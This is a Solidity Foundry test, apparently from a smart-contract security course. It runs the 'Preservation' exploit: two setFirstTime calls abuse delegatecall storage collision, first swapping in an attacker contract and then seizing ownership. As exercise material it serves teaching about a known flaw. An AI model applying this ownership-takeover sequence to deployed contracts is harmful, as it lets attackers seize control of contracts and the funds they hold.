// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Preservation} from "../../src/security-in-smart-contract-development/Preservation.sol";
import {Attack} from "../../src/security-in-smart-contract-development/Preservation.sol";
import {LibraryContract} from "../../src/security-in-smart-contract-development/Preservation.sol";
import {console} from "forge-std/console.sol";
import {Test} from "forge-std/Test.sol";

contract TestPreservationAttack is Test {
    address presevartionOwner;
    address attacker;

    Preservation preservation;
    Attack attack;
    LibraryContract libraryContract1;
    LibraryContract libraryContract2;


    function setUp() public {
        libraryContract1 = new LibraryContract();
        libraryContract2 = new LibraryContract();

        presevartionOwner = makeAddr("PreservationOwner");
        attacker = makeAddr("Attacker");

        vm.prank(presevartionOwner);
        preservation = new Preservation(address(libraryContract1), address(libraryContract2));

        vm.prank(attacker);
        attack = new Attack();
    }


    function test_Attack() public {
        
        console.log("Initial Owner: ", preservation.owner());
        console.log("Attacker address: ", attacker);

        vm.startPrank(attacker);
        //change address of libraryContractadress of malicious contract         
        preservation.setFirstTime(uint256(uint160(address(attack))));

        //exploit delegatecall to change owner
        preservation.setFirstTime(uint256(uint160(attacker)));

        console.log("Owner after attack: ", preservation.owner());
    }
}

